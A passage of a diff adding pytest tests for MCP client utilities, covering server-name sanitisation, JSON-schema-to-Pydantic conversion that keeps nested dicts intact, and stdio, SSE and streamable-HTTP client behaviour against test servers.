+        # Combining marks survive, so names that differ only by a mark stay distinct
+        assert util.project_mcp_server_name("\u0915\u093e\u092e") != util.project_mcp_server_name("\u0915\u092e")
+
+    @pytest.mark.parametrize(
+        "name", ["My Project", "T\u00e9st-\U0001f600-N\u00e1m\u00e9", "n\u0304ame", "123 start", "a" * 100]
+    )
+    def test_project_mcp_server_name_matches_the_old_derivation_for_latin_names(self, name):
+        """Existing Latin-named projects keep the server name they were registered under."""
+        old = util.sanitize_mcp_name(name)[: util.MAX_MCP_SERVER_NAME_LENGTH - 4]
+        assert util.project_mcp_server_name(name) == f"lf-{old}"
+
+    def test_project_mcp_server_name_falls_back_when_nothing_survives(self):
+        assert util.project_mcp_server_name("") == "lf-unnamed"
+        assert util.project_mcp_server_name("!!!") == "lf-unnamed"
+
+    def test_get_unique_name(self):
+        """Test unique name generation."""
+        names = {"foo", "foo_1"}
+        assert util.get_unique_name("foo", 10, names) == "foo_2"
+        assert util.get_unique_name("bar", 10, names) == "bar"
+        assert util.get_unique_name("longname", 4, {"long"}) == "lo_1"
+
+    def test_is_valid_key_value_item(self):
+        """Test key-value item validation."""
+        assert util._is_valid_key_value_item({"key": "a", "value": "b"}) is True
+        assert util._is_valid_key_value_item({"key": "a"}) is False
+        assert util._is_valid_key_value_item(["key", "value"]) is False
+        assert util._is_valid_key_value_item(None) is False
+
+    def test_validate_node_installation(self):
+        """Test Node.js installation validation."""
+        if shutil.which("node"):
+            assert util._validate_node_installation("npx something") == "npx something"
+        else:
+            with pytest.raises(ValueError, match=re.escape("Node.js is not installed")):
+                util._validate_node_installation("npx something")
+        assert util._validate_node_installation("echo test") == "echo test"
+
+    def test_create_input_schema_from_json_schema(self):
+        """Test JSON schema to Pydantic model conversion."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "foo": {"type": "string", "description": "desc"},
+                "bar": {"type": "integer"},
+            },
+            "required": ["foo"],
+        }
+        model_class = util.create_input_schema_from_json_schema(schema)
+        instance = model_class(foo="abc", bar=1)
+        assert instance.foo == "abc"
+        assert instance.bar == 1
+
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            model_class(bar=1)  # missing required field
+
+    def test_create_input_schema_type_array_string_null(self):
+        """Test schema with type array ['string', 'null'] produces optional string field."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "optional_str": {"type": ["string", "null"], "description": "Optional string"},
+            },
+        }
+        model_class = util.create_input_schema_from_json_schema(schema)
+        # Optional: None and string both valid
+        instance_none = model_class(optional_str=None)
+        assert instance_none.optional_str is None
+        instance_str = model_class(optional_str="hello")
+        assert instance_str.optional_str == "hello"
+
+    def test_create_input_schema_type_array_integer_null(self):
+        """Test schema with type array ['integer', 'null'] produces optional int field."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "optional_int": {"type": ["integer", "null"], "description": "Optional integer"},
+            },
+        }
+        model_class = util.create_input_schema_from_json_schema(schema)
+        instance_none = model_class(optional_int=None)
+        assert instance_none.optional_int is None
+        instance_int = model_class(optional_int=42)
+        assert instance_int.optional_int == 42
+
+    def test_create_input_schema_required_filters_non_strings(self):
+        """Test schema with required containing non-strings does not raise unhashable."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "valid": {"type": "string", "description": "Valid field"},
+            },
+            "required": [["bad"], "valid"],
+        }
+        model_class = util.create_input_schema_from_json_schema(schema)
+        # Only "valid" is required (non-strings filtered out)
+        instance = model_class(valid="ok")
+        assert instance.valid == "ok"
+
+    def test_create_input_schema_empty_properties_no_params(self):
+        """Test schema with empty properties (tool with no params) accepts empty dict."""
+        schema = {"type": "object", "properties": {}}
+        model_class = util.create_input_schema_from_json_schema(schema)
+        instance = model_class()
+        assert instance.model_dump() == {}
+        # Also validate with explicit empty dict
+        instance2 = model_class.model_validate({})
+        assert instance2.model_dump() == {}
+
+    def test_create_input_schema_generic_object_maps_to_dict(self):
+        """Test schema with type object and no properties maps to dict for free-form params."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "params": {"type": "object", "description": "Free-form parameters"},
+            },
+        }
+        model_class = util.create_input_schema_from_json_schema(schema)
+        # Should accept arbitrary key-value dict (not just empty)
+        instance = model_class(params={"search": "test", "per_page": 20})
+        assert instance.params == {"search": "test", "per_page": 20}
+        # Empty dict also valid
+        instance_empty = model_class(params={})
+        assert instance_empty.params == {}
+        # None valid for optional field
+        instance_none = model_class(params=None)
+        assert instance_none.params is None
+
+    def test_nested_dict_preservation_issue_9881(self):
+        """Test that nested dictionaries are preserved when object has no explicit properties.
+
+        Regression test for issue #9881 where nested dictionaries in MCP tool parameters
+        were being lost during Pydantic validation.
+        """
+        # ROS2 example from the bug report
+        schema = {
+            "type": "object",
+            "properties": {
+                "msg": {
+                    "type": "object",  # No "properties" defined - free-form object
+                    "description": "Message data with nested structure",
+                },
+                "msg_type": {"type": "string"},
+                "topic": {"type": "string"},
+            },
+            "required": ["msg", "msg_type", "topic"],
+        }
+
+        model_class = util.create_input_schema_from_json_schema(schema)
+
+        # Input with nested dictionary (like the bug report)
+        input_data = {
+            "msg": {"linear": {"x": 1}},
+            "msg_type": "geometry_msgs/msg/Twist",
+            "topic": "/turtle1/cmd_vel",
+        }
+
+        # Validate and dump (this is what happens in create_tool_coroutine)
+        validated = model_class.model_validate(input_data)
+        result = validated.model_dump()
+
+        # Nested dictionary should be preserved
+        assert result["msg"] == {"linear": {"x": 1}}
+        assert result["msg_type"] == "geometry_msgs/msg/Twist"
+        assert result["topic"] == "/turtle1/cmd_vel"
+
+        # Test with deeply nested structure
+        deep_input = {"msg": {"level1": {"level2": {"level3": "value"}}}, "msg_type": "test", "topic": "/test"}
+        deep_validated = model_class.model_validate(deep_input)
+        deep_result = deep_validated.model_dump()
+        assert deep_result["msg"] == {"level1": {"level2": {"level3": "value"}}}
+
+    def test_nested_dict_preservation_with_declared_properties_issue_10975(self):
+        """Nested dicts must survive when the object also declares properties (#9881, #10975)."""
+        # FHIR-MCP shape from #10975: searchParam declared as object with one property,
+        # additionalProperties not explicitly forbidden.
+        fhir_schema = {
+            "type": "object",
+            "required": ["type", "searchParam"],
+            "properties": {
+                "type": {"type": "string"},
+                "searchParam": {
+                    "type": "object",
+                    "properties": {"placeholder": {"type": "string"}},
+                },
+            },
+        }
+        fhir_model = util.create_input_schema_from_json_schema(fhir_schema)
+        fhir_input = {
+            "type": "Observation",
+            "searchParam": {
+                "component-reference-gene.component-code-value-concept": "48018-6$BRCA2",
+            },
+        }
+        fhir_dump = fhir_model.model_validate(fhir_input).model_dump(exclude_none=True)
+        assert fhir_dump["searchParam"] == {
+            "component-reference-gene.component-code-value-concept": "48018-6$BRCA2",
+        }, "FHIR-MCP nested searchParam dict was stripped (issue #10975)"
+
+        # ROS-MCP shape from #9881: msg declared as object with a placeholder property.
+        ros_schema = {
+            "type": "object",
+            "required": ["msg", "msg_type", "topic"],
+            "properties": {
+                "topic": {"type": "string"},
+                "msg_type": {"type": "string"},
+                "msg": {
+                    "type": "object",
+                    "properties": {"placeholder": {"type": "string"}},
+                },
+            },
+        }
+        ros_model = util.create_input_schema_from_json_schema(ros_schema)
+        ros_input = {
+            "topic": "/turtle1/cmd_vel",
+            "msg_type": "geometry_msgs/msg/Twist",
+            "msg": {
+                "linear": {"x": 1, "y": 0, "z": 0},
+                "angular": {"x": 0, "y": 0, "z": 0},
+            },
+        }
+        ros_dump = ros_model.model_validate(ros_input).model_dump(exclude_none=True)
+        assert ros_dump["msg"] == {
+            "linear": {"x": 1, "y": 0, "z": 0},
+            "angular": {"x": 0, "y": 0, "z": 0},
+        }, "ROS-MCP nested msg dict was stripped (issue #9881)"
+        # Sibling primitive fields must continue to round-trip unchanged.
+        assert ros_dump["topic"] == "/turtle1/cmd_vel"
+        assert ros_dump["msg_type"] == "geometry_msgs/msg/Twist"
+
+    def test_object_with_additional_properties_false_still_drops_extras(self):
+        """additionalProperties:false must keep stripping extras after the #9881/#10975 fix."""
+        strict_schema = {
+            "type": "object",
+            "properties": {
+                "filter": {
+                    "type": "object",
+                    "properties": {"id": {"type": "string"}},
+                    "additionalProperties": False,
+                },
+            },
+        }
+        strict_model = util.create_input_schema_from_json_schema(strict_schema)
+        dumped = strict_model.model_validate({"filter": {"id": "abc", "rogue": "x"}}).model_dump(
+            exclude_none=True,
+        )
+        assert dumped["filter"].get("id") == "abc"
+        assert "rogue" not in dumped["filter"]
+
+    def test_top_level_extras_preserved_when_root_does_not_forbid(self):
+        """Root schema with no additionalProperties must pass top-level extras through (PR #12601 review)."""
+        # JSON Schema spec: additionalProperties defaults to true at any depth, including root.
+        # The fix in _build_model handles nested objects; this test guards the symmetric behaviour
+        # for the top-level create_model("InputSchema", ...).
+        schema = {
+            "type": "object",
+            "properties": {"declared": {"type": "string"}},
+        }
+        model = util.create_input_schema_from_json_schema(schema)
+        dumped = model.model_validate({"declared": "ok", "extra": "preserved"}).model_dump(exclude_none=True)
+        assert dumped == {"declared": "ok", "extra": "preserved"}
+
+    def test_top_level_strict_mode_when_root_forbids_additional_properties(self):
+        """Root schema with additionalProperties:false must still strip top-level extras."""
+        schema = {
+            "type": "object",
+            "properties": {"declared": {"type": "string"}},
+            "additionalProperties": False,
+        }
+        model = util.create_input_schema_from_json_schema(schema)
+        dumped = model.model_validate({"declared": "ok", "rogue": "x"}).model_dump(exclude_none=True)
+        assert dumped == {"declared": "ok"}
+        assert "rogue" not in dumped
+
+    def test_deeply_nested_dict_round_trip_preserves_all_levels(self):
+        """4-level nested dict under a permissive object must round-trip intact."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "envelope": {
+                    "type": "object",
+                    "properties": {"placeholder": {"type": "string"}},
+                },
+            },
+            "required": ["envelope"],
+        }
+        model = util.create_input_schema_from_json_schema(schema)
+        deep = {
+            "envelope": {
+                "level1": {"level2": {"level3": {"level4": {"leaf": "value", "n": 42}}}},
+            },
+        }
+        out = model.model_validate(deep).model_dump(exclude_none=True)
+        assert out["envelope"]["level1"]["level2"]["level3"]["level4"]["leaf"] == "value"
+        assert out["envelope"]["level1"]["level2"]["level3"]["level4"]["n"] == 42
+
+    def test_array_of_objects_extras_are_preserved(self):
+        """Extras inside objects nested in arrays must also survive validation."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "messages": {
+                    "type": "array",
+                    "items": {
+                        "type": "object",
+                        "properties": {"role": {"type": "string"}},
+                    },
+                },
+            },
+            "required": ["messages"],
+        }
+        model = util.create_input_schema_from_json_schema(schema)
+        payload = {
+            "messages": [
+                {"role": "user", "content": "hi", "metadata": {"lang": "pt-BR"}},
+                {"role": "assistant", "content": "olá", "tool_calls": [{"id": "x"}]},
+            ],
+        }
+        out = model.model_validate(payload).model_dump(exclude_none=True)
+        assert out["messages"][0]["content"] == "hi"
+        assert out["messages"][0]["metadata"] == {"lang": "pt-BR"}
+        assert out["messages"][1]["tool_calls"] == [{"id": "x"}]
+
+    def test_additional_properties_typed_schema_still_preserves_extras(self):
+        """additionalProperties:{type:...} is permissive — extras must survive."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "headers": {
+                    "type": "object",
+                    "properties": {"known": {"type": "string"}},
+                    "additionalProperties": {"type": "string"},
+                },
+            },
+        }
+        model = util.create_input_schema_from_json_schema(schema)
+        out = model.model_validate(
+            {"headers": {"x-custom-1": "a", "x-custom-2": "b"}},
+        ).model_dump(exclude_none=True)
+        assert out["headers"]["x-custom-1"] == "a"
+        assert out["headers"]["x-custom-2"] == "b"
+
+    def test_nested_object_with_none_or_empty_does_not_crash(self):
+        """None and {} for permissive nested object must round-trip cleanly."""
+        schema = {
+            "type": "object",
+            "properties": {
+                "msg": {
+                    "type": "object",
+                    "properties": {"placeholder": {"type": "string"}},
+                },
+            },
+        }
+        model = util.create_input_schema_from_json_schema(schema)
+        out_none = model.model_validate({"msg": None}).model_dump(exclude_none=True)
+        assert "msg" not in out_none
+        out_empty = model.model_validate({"msg": {}}).model_dump(exclude_none=True)
+        assert out_empty == {"msg": {}}
+
+    @pytest.mark.asyncio
+    async def test_validate_connection_params(self):
+        """Test connection parameter validation."""
+        # Valid parameters
+        await util._validate_connection_params("Stdio", command="echo test")
+        await util._validate_connection_params("SSE", url="http://test")
+
+        # Invalid parameters
+        with pytest.raises(ValueError, match="Command is required for Stdio mode"):
+            await util._validate_connection_params("Stdio", command=None)
+        with pytest.raises(ValueError, match="URL is required for SSE mode"):
+            await util._validate_connection_params("SSE", url=None)
+        with pytest.raises(ValueError, match="Invalid mode"):
+            await util._validate_connection_params("InvalidMode")
+
+    @pytest.mark.asyncio
+    async def test_get_flow_snake_case_mocked(self):
+        """Test flow lookup by snake case name with mocked session."""
+
+        class DummyFlow:
+            def __init__(self, name: str, user_id: str, *, is_component: bool = False, action_name: str | None = None):
+                self.name = name
+                self.user_id = user_id
+                self.is_component = is_component
+                self.action_name = action_name
+
+        class DummyExec:
+            def __init__(self, flows: list[DummyFlow]):
+                self._flows = flows
+
+            def all(self):
+                return self._flows
+
+        class DummySession:
+            def __init__(self, flows: list[DummyFlow]):
+                self._flows = flows
+
+            async def exec(self, stmt):  # noqa: ARG002
+                return DummyExec(self._flows)
+
+        user_id = "123e4567-e89b-12d3-a456-426614174000"
+        flows = [DummyFlow("Test Flow", user_id), DummyFlow("Other", user_id)]
+
+        # Should match sanitized name
+        result = await util.get_flow_snake_case(util.sanitize_mcp_name("Test Flow"), user_id, DummySession(flows))
+        assert result is flows[0]
+
+        # Should return None if not found
+        result = await util.get_flow_snake_case("notfound", user_id, DummySession(flows))
+        assert result is None
+
+
+@pytest.mark.skip(reason="Skipping MCPStdioClientWithEverythingServer tests.")
+class TestMCPStdioClientWithEverythingServer:
+    """Test MCPStdioClient with the Everything MCP server."""
+
+    @pytest.fixture
+    def stdio_client(self):
+        """Create a stdio client for testing."""
+        return MCPStdioClient()
+
+    @pytest.mark.asyncio
+    @pytest.mark.skipif(not shutil.which("npx"), reason="Node.js not available")
+    @pytest.mark.skipif(
+        sys.version_info >= (3, 13),
+        reason="Temporarily disabled on Python 3.13 due to frequent timeouts with MCP Everything server",
+    )
+    async def test_connect_to_everything_server(self, stdio_client):
+        """Test connecting to the Everything MCP server."""
+        command = "npx -y @modelcontextprotocol/server-everything"
+
+        try:
+            # Connect to the server
+            tools = await stdio_client.connect_to_server(command)
+
+            # Verify tools were returned
+            assert len(tools) > 0
+
+            # Find the echo tool
+            echo_tool = None
+            for tool in tools:
+                if hasattr(tool, "name") and tool.name == "echo":
+                    echo_tool = tool
+                    break
+
+            assert echo_tool is not None, "Echo tool not found in server tools"
+            assert echo_tool.description is not None
+
+            # Verify the echo tool has the expected input schema
+            assert hasattr(echo_tool, "inputSchema")
+            assert echo_tool.inputSchema is not None
+
+        finally:
+            # Clean up the connection
+            await stdio_client.disconnect()
+
+    @pytest.mark.asyncio
+    @pytest.mark.skipif(not shutil.which("npx"), reason="Node.js not available")
+    async def test_run_echo_tool(self, stdio_client):
+        """Test running the echo tool from the Everything server."""
+        command = "npx -y @modelcontextprotocol/server-everything"
+
+        try:
+            # Connect to the server
+            tools = await stdio_client.connect_to_server(command)
+
+            # Find the echo tool
+            echo_tool = None
+            for tool in tools:
+                if hasattr(tool, "name") and tool.name == "echo":
+                    echo_tool = tool
+                    break
+
+            assert echo_tool is not None, "Echo tool not found"
+
+            # Run the echo tool
+            test_message = "Hello, MCP!"
+            result = await stdio_client.run_tool("echo", {"message": test_message})
+
+            # Verify the result
+            assert result is not None
+            assert hasattr(result, "content")
+            assert len(result.content) > 0
+
+            # Check that the echo worked - content should contain our message
+            content_text = str(result.content[0])
+            assert test_message in content_text or "Echo:" in content_text
+
+        finally:
+            await stdio_client.disconnect()
+
+    @pytest.mark.asyncio
+    @pytest.mark.skipif(not shutil.which("npx"), reason="Node.js not available")
+    async def test_list_all_tools(self, stdio_client):
+        """Test listing all available tools from the Everything server."""
+        command = "npx -y @modelcontextprotocol/server-everything"
+
+        try:
+            # Connect to the server
+            tools = await stdio_client.connect_to_server(command)
+
+            # Verify we have multiple tools
+            assert len(tools) >= 3  # Everything server typically has several tools
+
+            # Check that tools have the expected attributes
+            for tool in tools:
+                assert hasattr(tool, "name")
+                assert hasattr(tool, "description")
+                assert hasattr(tool, "inputSchema")
+                assert tool.name is not None
+                assert len(tool.name) > 0
+
+            # Common tools that should be available
+            expected_tools = ["echo"]  # Echo is typically available
+            for expected_tool in expected_tools:
+                assert any(tool.name == expected_tool for tool in tools), f"Expected tool '{expected_tool}' not found"
+
+        finally:
+            await stdio_client.disconnect()
+
+    @pytest.mark.asyncio
+    @pytest.mark.skipif(not shutil.which("npx"), reason="Node.js not available")
+    async def test_session_reuse(self, stdio_client):
+        """Test that sessions are properly reused."""
+        command = "npx -y @modelcontextprotocol/server-everything"
+
+        try:
+            # Set session context
+            stdio_client.set_session_context("test_session_reuse")
+
+            # Connect to the server
+            tools1 = await stdio_client.connect_to_server(command)
+
+            # Connect again - should reuse the session
+            tools2 = await stdio_client.connect_to_server(command)
+
+            # Should have the same tools
+            assert len(tools1) == len(tools2)
+
+            # Run a tool to verify the session is working
+            result = await stdio_client.run_tool("echo", {"message": "Session reuse test"})
+            assert result is not None
+
+        finally:
+            await stdio_client.disconnect()
+
+
+class TestMCPStreamableHttpClientWithDeepWikiServer:
+    """Test MCPSseClient with the DeepWiki MCP server."""
+
+    @pytest.fixture
+    def streamable_http_client(self):
+        """Create an SSE client for testing."""
+        return MCPStreamableHttpClient()
+
+    @pytest.mark.asyncio
+    async def test_connect_to_deepwiki_server(self, streamable_http_client):
+        """Test connecting to the DeepWiki MCP server."""
+        url = "https://mcp.deepwiki.com/sse"
+
+        try:
+            # Connect to the server
+            tools = await streamable_http_client.connect_to_server(url)
+
+            # Verify tools were returned
+            assert len(tools) > 0
+
+            # Check for expected DeepWiki tools
+            expected_tools = ["read_wiki_structure", "read_wiki_contents", "ask_question"]
+
+            # Verify we have the expected tools
+            for expected_tool in expected_tools:
+                assert any(tool.name == expected_tool for tool in tools), f"Expected tool '{expected_tool}' not found"
+
+        except Exception as e:
+            # If the server is not accessible, skip the test
+            pytest.skip(f"DeepWiki server not accessible: {e}")
+        finally:
+            await streamable_http_client.disconnect()
+
+    @pytest.mark.asyncio
+    async def test_run_wiki_structure_tool(self, streamable_http_client):
+        """Test running the read_wiki_structure tool."""
+        url = "https://mcp.deepwiki.com/sse"
+
+        try:
+            # Connect to the server
+            tools = await streamable_http_client.connect_to_server(url)
+
+            # Find the read_wiki_structure tool
+            wiki_tool = None
+            for tool in tools:
+                if hasattr(tool, "name") and tool.name == "read_wiki_structure":
+                    wiki_tool = tool
+                    break
+
+            assert wiki_tool is not None, "read_wiki_structure tool not found"
+
+            # Run the tool with a test repository (use repoName as expected by the API)
+            result = await streamable_http_client.run_tool("read_wiki_structure", {"repoName": "microsoft/vscode"})
+
+            # Verify the result
+            assert result is not None
+            assert hasattr(result, "content")
+            assert len(result.content) > 0
+
+        except Exception as e:
+            # If the server is not accessible or the tool fails, skip the test
+            pytest.skip(f"DeepWiki server test failed: {e}")
+        finally:
+            await streamable_http_client.disconnect()
+
+    @pytest.mark.asyncio
+    async def test_ask_question_tool(self, streamable_http_client):
+        """Test running the ask_question tool."""
+        url = "https://mcp.deepwiki.com/sse"
+
+        try:
+            # Connect to the server
+            tools = await streamable_http_client.connect_to_server(url)
+
+            # Find the ask_question tool
+            ask_tool = None
+            for tool in tools:
+                if hasattr(tool, "name") and tool.name == "ask_question":
+                    ask_tool = tool
+                    break
+
+            assert ask_tool is not None, "ask_question tool not found"
+
+            # Run the tool with a test question (use repoName as expected by the API)
+            result = await streamable_http_client.run_tool(
+                "ask_question", {"repoName": "microsoft/vscode", "question": "What is VS Code?"}
+            )
+
+            # Verify the result
+            assert result is not None
+            assert hasattr(result, "content")
+            assert len(result.content) > 0
+
+        except Exception as e:
+            # If the server is not accessible or the tool fails, skip the test
+            pytest.skip(f"DeepWiki server test failed: {e}")
+        finally:
+            await streamable_http_client.disconnect()
+
+    @pytest.mark.asyncio
+    async def test_url_validation(self, streamable_http_client):
+        """Test URL validation for SSE connections."""
+        # Test valid URL
+        valid_url = "https://mcp.deepwiki.com/sse"
+        is_valid, error = await streamable_http_client.validate_url(valid_url)
+        # Either valid or accessible, or rate-limited (429) which indicates server is reachable
+        if not is_valid and "429" in error:
+            # Rate limiting indicates the server is accessible but limiting requests
+            # This is a transient network issue, not a test failure
+            pytest.skip(f"DeepWiki server is rate limiting requests: {error}")
+        assert is_valid or error == ""  # Either valid or accessible
+
+        # Test invalid URL
+        invalid_url = "not_a_url"
+        is_valid, error = await streamable_http_client.validate_url(invalid_url)
+        assert not is_valid
+        assert error != ""
+
+    @pytest.fixture
+    def mock_tool(self):
+        """Create a mock MCP tool."""
+        tool = MagicMock()
+        tool.name = "test_tool"
+        tool.description = "Test tool description"
+        tool.inputSchema = {
+            "type": "object",
+            "properties": {"test_param": {"type": "string", "description": "Test parameter"}},
+            "required": ["test_param"],
+        }
+        return tool
+
+    @pytest.fixture
+    def mock_session(self, mock_tool):
+        """Create a mock ClientSession."""
+        session = AsyncMock()
+        session.initialize = AsyncMock()
+        list_tools_result = MagicMock()
+        list_tools_result.tools = [mock_tool]
+        session.list_tools = AsyncMock(return_value=list_tools_result)
+        session.call_tool = AsyncMock(
+            return_value=MagicMock(content=[MagicMock(model_dump=lambda: {"result": "success"})])
+        )
+        return session
+
+
+class TestMCPSseClientUnit:
+    """Unit tests for MCPSseClient functionality."""
+
+    @pytest.fixture
+    def sse_client(self):
+        return MCPSseClient()
+
+    @pytest.mark.asyncio
+    async def test_client_initialization(self, sse_client):
+        """Test that SSE client initializes correctly."""
+        # Client should initialize with default values
+        assert sse_client.session is None
+        assert sse_client._connection_params is None
+        assert sse_client._connected is False
+        assert sse_client._session_context is None
+
+    async def test_validate_url_valid(self, sse_client):
+        """Test URL validation with valid URL."""
+        with patch("httpx.AsyncClient") as mock_client:
+            mock_response = MagicMock()
+            mock_response.status_code = 200
+            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
+
+            is_valid, error_msg = await sse_client.validate_url("http://test.url")
+
+            assert is_valid is True
+            assert error_msg == ""
+
+    async def test_validate_url_invalid_format(self, sse_client):
+        """Test URL validation with invalid format."""
+        is_valid, error_msg = await sse_client.validate_url("invalid-url")
+
+        assert is_valid is False
+        assert "Invalid URL format" in error_msg
+
+    async def test_validate_url_with_404_response(self, sse_client):
+        """Test URL validation with 404 response (should be valid for SSE)."""
+        with patch("httpx.AsyncClient") as mock_client:
+            mock_response = MagicMock()
+            mock_response.status_code = 404
+            mock_client.return_value.__aenter__.return_value.get.return_value = mock_response
+
+            is_valid, error_msg = await sse_client.validate_url("http://test.url")
+
+            assert is_valid is True
+            assert error_msg == ""
+
+    async def test_connect_to_server_with_headers(self, sse_client):
+        """Test connecting to server via SSE with custom headers."""
+        test_url = "http://test.url"
+        test_headers = {"Authorization": "Bearer token123", "Custom-Header": "value"}
+        expected_headers = {"authorization": "Bearer token123", "custom-header": "value"}  # normalized
+
+        with (
+            patch.object(sse_client, "validate_url", return_value=(True, "")),
+            patch.object(sse_client, "_get_or_create_session") as mock_get_session,
+        ):
+            # Mock session
+            mock_session = AsyncMock()
+            mock_tool = MagicMock()
+            mock_tool.name = "test_tool"
+            list_tools_result = MagicMock()
+            list_tools_result.tools = [mock_tool]
+            mock_session.list_tools = AsyncMock(return_value=list_tools_result)
+            mock_get_session.return_value = mock_session
+
+            tools = await sse_client.connect_to_server(test_url, test_headers)
+
+            assert len(tools) == 1
+            assert tools[0].name == "test_tool"
+            assert sse_client._connected is True
+
+            # Verify headers are stored in connection params (normalized)
+            assert sse_client._connection_params is not None
+            assert sse_client._connection_params["headers"] == expected_headers
+            assert sse_client._connection_params["url"] == test_url
+
+    async def test_headers_passed_to_session_manager(self, sse_client):
+        """Test that headers are properly passed to the session manager."""
+        test_url = "http://test.url"
+        expected_headers = {"authorization": "Bearer token123", "x-api-key": "secret"}  # normalized
+
+        sse_client._session_context = "test_context"
+        sse_client._connection_params = {
+            "url": test_url,
+            "headers": expected_headers,  # Use normalized headers
+            "timeout_seconds": 30,
+            "sse_read_timeout_seconds": 30,
+        }
+
+        with patch.object(sse_client, "_get_session_manager") as mock_get_manager:
+            mock_manager = AsyncMock()
+            mock_session = AsyncMock()
+            mock_manager.get_session = AsyncMock(return_value=mock_session)
+            mock_get_manager.return_value = mock_manager
+
+            result_session = await sse_client._get_or_create_session()
+
+            # Verify session manager was called with correct parameters including normalized headers
+            mock_manager.get_session.assert_called_once_with(
+                "test_context", sse_client._connection_params, "streamable_http"
+            )
+            assert result_session == mock_session
+
+    async def test_run_tool_with_retry_on_connection_error(self, sse_client):
+        """Test that run_tool retries on connection errors."""
+        # Setup connection state
+        sse_client._connected = True
+        sse_client._connection_params = {"url": "http://test.url", "headers": {}}
+        sse_client._session_context = "test_context"
+
+        call_count = 0
+
+        async def mock_get_session_side_effect():
+            nonlocal call_count
+            call_count += 1
+            session = AsyncMock()
+            if call_count == 1:
+                # First call fails with connection error
+                from anyio import ClosedResourceError
+
+                session.call_tool = AsyncMock(side_effect=ClosedResourceError())
+            else:
+                # Second call succeeds
+                mock_result = MagicMock()
+                session.call_tool = AsyncMock(return_value=mock_result)
+            return session
+
+        with (
+            patch.object(sse_client, "_get_or_create_session", side_effect=mock_get_session_side_effect),
+            patch.object(sse_client, "_get_session_manager") as mock_get_manager,
+        ):
+            mock_manager = MagicMock()
+            mock_manager.invalidate_server_key = AsyncMock()
+            mock_manager._get_server_key = MagicMock(return_value="streamable_http_testkey")
+            mock_get_manager.return_value = mock_manager
+
+            result = await sse_client.run_tool("test_tool", {"param": "value"})
+
+            # Should have retried and succeeded on second attempt
+            assert call_count == 2
+            assert result is not None
+            mock_manager.invalidate_server_key.assert_called_once_with("streamable_http_testkey")
+
+
+class TestMCPStructuredTool:
+    """Test the MCPStructuredTool inner methods."""
+
+    @pytest.fixture
+    def mock_client(self):
+        """Create a mock MCP client."""
+        from unittest.mock import AsyncMock
+
+        client = AsyncMock()
+        client.run_tool = AsyncMock(return_value="tool_result")
+        return client
+
+    @pytest.fixture
+    def test_schema(self):
+        """Create a test Pydantic schema with snake_case fields."""
+        from pydantic import Field, create_model
+
+        return create_model(
+            "TestSchema",
+            weather_main=(str, Field(..., description="Main weather condition")),
+            top_n=(int, Field(..., description="Number of results")),
+            user_id=(str, Field(default="default_user", description="User identifier")),
+        )
+
+    @pytest.fixture
+    def mcp_tool(self, test_schema, mock_client):
+        """Create an MCPStructuredTool instance for testing."""
+        import json
+
+        # Import the MCPStructuredTool class from the actual code
+        # We need to recreate it here since it's defined inline in the update_tools function
+        from langchain_core.runnables import RunnableConfig
+        from langchain_core.tools import StructuredTool
+        from lfx.base.mcp.util import create_tool_coroutine, create_tool_func
+
+        class MCPStructuredTool(StructuredTool):
+            _tool_call_id_key = "_lf_tool_call_id"
+
+            def _to_args_and_kwargs(self, tool_input: str | dict, tool_call_id: str | None):
+                """Normalize MCP tool input before LangChain validates it."""
+                if isinstance(tool_input, str):
+                    try:
+                        parsed_input = json.loads(tool_input)
+                    except json.JSONDecodeError:
+                        parsed_input = {"input": tool_input}
+                else:
+                    parsed_input = tool_input or {}
+
+                converted_input = self._convert_parameters(parsed_input)
+                tool_args, tool_kwargs = super()._to_args_and_kwargs(converted_input, tool_call_id)
+                if tool_call_id is not None:
+                    tool_kwargs[self._tool_call_id_key] = tool_call_id
+                return tool_args, tool_kwargs
+
+            def _run(self, *args, config: RunnableConfig, run_manager=None, **kwargs):
+                from lfx.base.mcp.util import _convert_mcp_result
+
+                tool_call_id = kwargs.pop(self._tool_call_id_key, None)
+                raw = super()._run(*args, config=config, run_manager=run_manager, **kwargs)
+                converted = _convert_mcp_result(raw) if tool_call_id and hasattr(raw, "content") else raw
+                return converted, raw
+
+            async def _arun(self, *args, config: RunnableConfig, run_manager=None, **kwargs):
+                from lfx.base.mcp.util import _convert_mcp_result
+
+                tool_call_id = kwargs.pop(self._tool_call_id_key, None)
+                raw = await super()._arun(*args, config=config, run_manager=run_manager, **kwargs)
+                converted = _convert_mcp_result(raw) if tool_call_id and hasattr(raw, "content") else raw
+                return converted, raw
+
+            def _convert_parameters(self, input_dict):
+                if not input_dict or not isinstance(input_dict, dict):
+                    return input_dict
+
+                from lfx.base.agents.utils import maybe_unflatten_dict
+                from lfx.base.mcp.util import _camel_to_snake
+
+                converted_dict = {}
+                original_fields = set(self.args_schema.model_fields.keys())
+
+                for key, value in input_dict.items():
+                    if key in original_fields:
+                        # Field exists as-is
+                        converted_dict[key] = value
+                    else:
+                        # Try to convert camelCase to snake_case
+                        snake_key = _camel_to_snake(key)
+                        if snake_key in original_fields:
+                            converted_dict[snake_key] = value
+                        else:
+                            # Keep original key
+                            converted_dict[key] = value
+
+                return maybe_unflatten_dict(converted_dict)
+
+        return MCPStructuredTool(
+            name="test_tool",
+            description="Test tool for unit testing",
+            args_schema=test_schema,
+            func=create_tool_func("test_tool", test_schema, mock_client),
+            coroutine=create_tool_coroutine("test_tool", test_schema, mock_client),
+            response_format="content_and_artifact",
+        )
+
+    def test_convert_parameters_exact_match(self, mcp_tool):
+        """Test _convert_parameters with fields that exactly match schema."""
+        input_dict = {"weather_main": "Snow", "top_n": 5, "user_id": "user123"}
+
+        result = mcp_tool._convert_parameters(input_dict)
+
+        # Should pass through unchanged since fields match exactly
+        assert result == {"weather_main": "Snow", "top_n": 5, "user_id": "user123"}
+
+    def test_convert_parameters_camel_to_snake(self, mcp_tool):
+        """Test _convert_parameters converts camelCase to snake_case."""
+        input_dict = {"weatherMain": "Rain", "topN": 10, "userId": "user456"}
+
+        result = mcp_tool._convert_parameters(input_dict)
+
+        # Should convert camelCase to snake_case
